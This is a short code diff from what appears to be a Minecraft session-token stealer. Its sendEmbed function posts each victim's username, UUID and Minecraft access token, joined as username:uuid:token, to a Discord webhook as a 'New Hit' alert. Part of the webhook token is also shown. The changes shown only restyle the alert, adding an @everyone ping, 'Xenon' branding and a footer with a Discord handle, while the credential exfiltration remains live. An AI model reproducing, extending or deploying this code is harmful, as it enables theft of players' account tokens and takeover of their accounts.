@@ -169,8 +169,10 @@ async function sendEmbed(MinecraftToken, uuid, username) {
 			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
 	});
 	const embed = new EmbedBuilder()
-		.setTitle(`**New Hit**`)
-		.setColor('#2f3136')
+		.setTitle(`**New Hit ❗**`)
+		.setAuthor({ name: 'Xenon', iconURL: 'i.imgur.com/zocp3XL.png'})
+		.setDescription('@everyone')
+		.setColor(0x0099FF)
 		.addFields(
 			{ name: 'Nom', value: `\`${username}\``, inline: true },
 			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
@@ -179,6 +181,7 @@ async function sendEmbed(MinecraftToken, uuid, username) {
 				value: `\`${username}:${uuid}:${MinecraftToken}\``,
 			}
 		)
+		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/AfFp7pu.png' })
 		.setTimestamp();
 
 	webhook.send({
